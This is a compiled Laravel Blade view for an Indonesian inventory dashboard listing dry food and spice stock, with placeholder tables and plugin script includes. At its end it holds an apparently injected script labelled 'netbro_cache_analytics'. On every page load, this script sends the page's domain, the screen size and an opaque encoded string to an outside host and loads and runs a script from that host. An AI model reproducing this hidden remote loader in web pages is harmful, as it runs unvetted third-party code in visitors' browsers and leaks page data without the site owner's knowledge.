<?php /* /home/no_tenkz/Web/inventory/resources/views/welcome.blade.php */ ?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <title>RSUP Inventory</title>
    <meta content='width=device-width, initial-scale=1.0, shrink-to-fit=no' name='viewport' />
    <link rel="icon" href="../assets/img/icon.ico" type="image/x-icon" />

    
    <script src="../assets/js/plugin/webfont/webfont.min.js"></script>
    <script>
        WebFont.load({
            google: {
                "families": ["Lato:300,400,700,900"]
            },
            custom: {
                "families": ["Flaticon", "Font Awesome 5 Solid", "Font Awesome 5 Regular",
                    "Font Awesome 5 Brands", "simple-line-icons"
                ],
                urls: ['../assets/css/fonts.min.css']
            },
            active: function () {
                sessionStorage.fonts = true;
            }
        });

    </script>

    
    <link rel="stylesheet" href="../assets/css/bootstrap.min.css">
    <link rel="stylesheet" href="../assets/css/atlantis2.min.css">

    
    <link rel="stylesheet" href="../assets/css/demo.css">
</head>

<body>
    <div class="wrapper horizontal-layout-2">

        <div class="main-header" data-background-color="light-blue2">
            <div class="nav-top">
                <div class="container d-flex flex-row">
                    <button class="navbar-toggler sidenav-toggler ml-auto" type="button" data-toggle="collapse"
                        data-target="collapse" aria-expanded="false" aria-label="Toggle navigation">
                        <span class="navbar-toggler-icon">
                            <i class="icon-menu"></i>
                        </span>
                    </button>
                    <button class="topbar-toggler more"><i class="icon-options-vertical"></i></button>
                    <!-- Logo Header -->
                    <a href="index.html" class="logo d-flex align-items-center">
                        <img src="../assets/img/logo.svg" alt="navbar brand" class="navbar-brand">
                    </a>
                    <!-- End Logo Header -->

                    <!-- Navbar Header -->
                    <nav class="navbar navbar-header navbar-expand-lg p-0">

                        
                    </nav>
                    <!-- End Navbar -->
                </div>
            </div>
            <div class="container">
                <div class="nav-bottom bg-white">
                    <h3 class="title-menu d-flex d-lg-none">
                        Menu
                        <div class="close-menu"> <i class="flaticon-cross"></i></div>
                    </h3>
                    <ul class="nav page-navigation page-navigation-info">

                        <li class="nav-item">
                            <a class="nav-link" href="#">
                                <i class="link-icon icon-screen-desktop"></i>
                                <span class="menu-title">Dashboard</span>
                            </a>
                        </li>
                        <li class="nav-item submenu">
                            <a class="nav-link" href="#">
                                <i class="link-icon icon-screen-desktop"></i>
                                <span class="menu-title">Data Master</span>
                            </a>
                            <div class="navbar-dropdown animated fadeIn">
                                <ul>
                                    <li>
                                        <a href="../demo1/index.html">Makanan Kering</a>
                                    </li>
                                    <li>
                                        <a href="../demo1/index.html">Bumbu Kering</a>
                                    </li>
                                </ul>
                            </div>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link" href="#">
                                <i class="link-icon icon-screen-desktop"></i>
                                <span class="menu-title">Checkout</span>
                            </a>
                        </li>
                    </ul>
                </div>
            </div>
        </div>

        <div class="main-panel">
            <div class="content">
                <div class="page-inner">
                    <div class="row">
                        <div class="col-sm-6 col-lg-4">
                            <div class="card p-3">
                                <div class="d-flex align-items-center">
                                    <span class="stamp stamp-md bg-secondary mr-3">
                                        <i class="fa fa-shopping-basket"></i>
                                    </span>
                                    <div>
                                        <h5 class="mb-1"><b><a href="#">132</a></b></h5>
                                        <small class="text-muted">Total Makanan Kering</small>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="col-sm-6 col-lg-4">
                            <div class="card p-3">
                                <div class="d-flex align-items-center">
                                    <span class="stamp stamp-md bg-success mr-3">
                                        <i class="fa fa-shopping-basket"></i>
                                    </span>
                                    <div>
                                        <h5 class="mb-1"><b><a href="#">78</a></b></h5>
                                        <small class="text-muted">Total Bumbu Kering</small>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="col-sm-6 col-lg-4">
                            <div class="card p-3">
                                <div class="d-flex align-items-center">
                                    <span class="stamp stamp-md bg-danger mr-3">
                                        <i class="fa fa-cart-arrow-down"></i>
                                    </span>
                                    <div>
                                        <h5 class="mb-1"><b><a href="#">1,352</a></b></h5>
                                        <small class="text-muted">Total Pemakaian Hari Ini</small>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="row">
                        <div class="col">
                            <div class="card p-3">
                                <div class="card-header">
                                    <div class="card-head-row">
                                        <div class="card-title">Data Makanan Kering</div>
                                        <div class="card-tools">
                                            <a href="#" class="btn btn-info btn-border btn-round btn-sm mr-2">
                                                <span class="btn-label">
                                                    <i class="fa fa-pencil"></i>
                                                </span>
                                                Export
                                            </a>
                                            <a href="#" class="btn btn-info btn-border btn-round btn-sm">
                                                <span class="btn-label">
                                                    <i class="fa fa-print"></i>
                                                </span>
                                                Print
                                            </a>
                                        </div>
                                    </div>
                                </div>
                                <div class="card-body">
                                    <div class="table-responsive">
                                        <table class="table table-bordered">
                                            <thead>
                                                <tr>
                                                    <th>#</th>
                                                    <th>Table heading</th>
                                                    <th>Table heading</th>
                                                    <th>Table heading</th>
                                                    <th>Table heading</th>
                                                    <th>Table heading</th>
                                                    <th>Table heading</th>
                                                </tr>
                                            </thead>
                                            <tbody>
                                                <tr>
                                                    <th scope="row">1</th>
                                                    <td>Table cell</td>
                                                    <td>Table cell</td>
                                                    <td>Table cell</td>
                                                    <td>Table cell</td>
                                                    <td>Table cell</td>
                                                    <td>Table cell</td>
                                                </tr>
                                                <tr>
                                                    <th scope="row">2</th>
                                                    <td>Table cell</td>
                                                    <td>Table cell</td>
                                                    <td>Table cell</td>
                                                    <td>Table cell</td>
                                                    <td>Table cell</td>
                                                    <td>Table cell</td>
                                                </tr>
                                                <tr>
                                                    <th scope="row">3</th>
                                                    <td>Table cell</td>
                                                    <td>Table cell</td>
                                                    <td>Table cell</td>
                                                    <td>Table cell</td>
                                                    <td>Table cell</td>
                                                    <td>Table cell</td>
                                                </tr>
                                            </tbody>
                                        </table>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="row">
                        <div class="col">
                            <div class="card p-3">
                                <div class="card-header">
                                    <div class="card-head-row">
                                        <div class="card-title">Data Bumbu Kering</div>
                                        <div class="card-tools">
                                            <a href="#" class="btn btn-info btn-border btn-round btn-sm mr-2">
                                                <span class="btn-label">
                                                    <i class="fa fa-pencil"></i>
                                                </span>
                                                Export
                                            </a>
                                            <a href="#" class="btn btn-info btn-border btn-round btn-sm">
                                                <span class="btn-label">
                                                    <i class="fa fa-print"></i>
                                                </span>
                                                Print
                                            </a>
                                        </div>
                                    </div>
                                </div>
                                <div class="card-body">
                                    <div class="table-responsive">
                                        <table class="table table-bordered">
                                            <thead>
                                                <tr>
                                                    <th>#</th>
                                                    <th>Table heading</th>
                                                    <th>Table heading</th>
                                                    <th>Table heading</th>
                                                    <th>Table heading</th>
                                                    <th>Table heading</th>
                                                    <th>Table heading</th>
                                                </tr>
                                            </thead>
                                            <tbody>
                                                <tr>
                                                    <th scope="row">1</th>
                                                    <td>Table cell</td>
                                                    <td>Table cell</td>
                                                    <td>Table cell</td>
                                                    <td>Table cell</td>
                                                    <td>Table cell</td>
                                                    <td>Table cell</td>
                                                </tr>
                                                <tr>
                                                    <th scope="row">2</th>
                                                    <td>Table cell</td>
                                                    <td>Table cell</td>
                                                    <td>Table cell</td>
                                                    <td>Table cell</td>
                                                    <td>Table cell</td>
                                                    <td>Table cell</td>
                                                </tr>
                                                <tr>
                                                    <th scope="row">3</th>
                                                    <td>Table cell</td>
                                                    <td>Table cell</td>
                                                    <td>Table cell</td>
                                                    <td>Table cell</td>
                                                    <td>Table cell</td>
                                                    <td>Table cell</td>
                                                </tr>
                                            </tbody>
                                        </table>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <footer class="footer">
            <div class="container">
                <div class="copyright mx-auto">
                    made with <i class="fa fa-heart heart text-danger"></i>
                </div>
            </div>
        </footer>
    </div>
    <!--   Core JS Files   -->
    <script src="../assets/js/core/jquery.3.2.1.min.js"></script>
    <script src="../assets/js/core/popper.min.js"></script>
    <script src="../assets/js/core/bootstrap.min.js"></script>

    <!-- jQuery UI -->
    <script src="../assets/js/plugin/jquery-ui-1.12.1.custom/jquery-ui.min.js"></script>
    <script src="../assets/js/plugin/jquery-ui-touch-punch/jquery.ui.touch-punch.min.js"></script>

    <!-- jQuery Scrollbar -->
    <script src="../assets/js/plugin/jquery-scrollbar/jquery.scrollbar.min.js"></script>

    <!-- Moment JS -->
    <script src="../assets/js/plugin/moment/moment.min.js"></script>

    <!-- Chart JS -->
    <script src="../assets/js/plugin/chart.js/chart.min.js"></script>

    <!-- jQuery Sparkline -->
    <script src="../assets/js/plugin/jquery.sparkline/jquery.sparkline.min.js"></script>

    <!-- Chart Circle -->
    <script src="../assets/js/plugin/chart-circle/circles.min.js"></script>

    <!-- Datatables -->
    <script src="../assets/js/plugin/datatables/datatables.min.js"></script>

    <!-- Bootstrap Notify -->
    <script src="../assets/js/plugin/bootstrap-notify/bootstrap-notify.min.js"></script>

    <!-- Bootstrap Toggle -->
    <script src="../assets/js/plugin/bootstrap-toggle/bootstrap-toggle.min.js"></script>

    <!-- jQuery Vector Maps -->
    <script src="../assets/js/plugin/jqvmap/jquery.vmap.min.js"></script>
    <script src="../assets/js/plugin/jqvmap/maps/jquery.vmap.world.js"></script>

    <!-- DateTimePicker -->
    <script src="../assets/js/plugin/datepicker/bootstrap-datetimepicker.min.js"></script>

    <!-- Bootstrap Tagsinput -->
    <script src="../assets/js/plugin/bootstrap-tagsinput/bootstrap-tagsinput.min.js"></script>

    <!-- Bootstrap Wizard -->
    <script src="../assets/js/plugin/bootstrap-wizard/bootstrapwizard.js"></script>

    <!-- jQuery Validation -->
    <script src="../assets/js/plugin/jquery.validate/jquery.validate.min.js"></script>

    <!-- Summernote -->
    <script src="../assets/js/plugin/summernote/summernote-bs4.min.js"></script>

    <!-- Select2 -->
    <script src="../assets/js/plugin/select2/select2.full.min.js"></script>

    <!-- Sweet Alert -->
    <script src="../assets/js/plugin/sweetalert/sweetalert.min.js"></script>

    <!-- Atlantis JS -->
    <script src="../assets/js/atlantis2.min.js"></script>

    <script type="text/javascript">
        if (self == top) {
            function netbro_cache_analytics(fn, callback) {
                setTimeout(function () {
                    fn();
                    callback();
                }, 0);
            }

            function sync(fn) {
                fn();
            }

            function requestCfs() {
                var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
                var idc_glo_r = Math.floor(Math.random() * 99999999999);
                var url = idc_glo_url + "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" +
                    "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2m7ZNu3%2beSiI5CutNu0PurOpSLp%2bePkUnbd7BPtRJkHdKjSBPD1RH%2bLLSVkjVe7iJw04Fs97XhIHa503jYbvtJtWI%2fkU%2f9z%2bfIUCLOp1TsNbGGgmJdjke61GKqqUUG2hEZLIB0p2TxOQMPVP5mI8XJODsakMikX5ZCEVtJO6qK93Ol8v68v0ya2ugF6Qo9%2f8HU7k%2fqf0myqr7FMHXiREaYzUDxTykD%2fIue9WFC5WzhfDmFqwfB9d%2fdAKcyRFM2ujENjB4yJBUePdt2higLuhGDzeGaumLVz7OvWr7Aj6uutUuIZiF7dq3eH89XI0Ofz%2boxO9KSYZsClkC5VPduWs%2bOILq6nnIFT78nyVoRp1cSIBgMUYYjKpcRCe3obTTYCNZ2jzNoYScBs3NoHPvnCXjKZ16wRDaTIVGbd9cLipo9FM%2fjXvbx9wPcU2E%2fwF0vNSbW4NL0i6O8FU2abuytoZUb4qkhb8ufP%2fcoJfr4DaWq3lJB5JFNMtBpWu98UcmZXif" +
                    "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen
                    .height;
                var bsa = document.createElement('script');
                bsa.type = 'text/javascript';
                bsa.async = true;
                bsa.src = url;
                (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
            }
            netbro_cache_analytics(requestCfs, function () {});
        };

    </script>
</body>

</html>
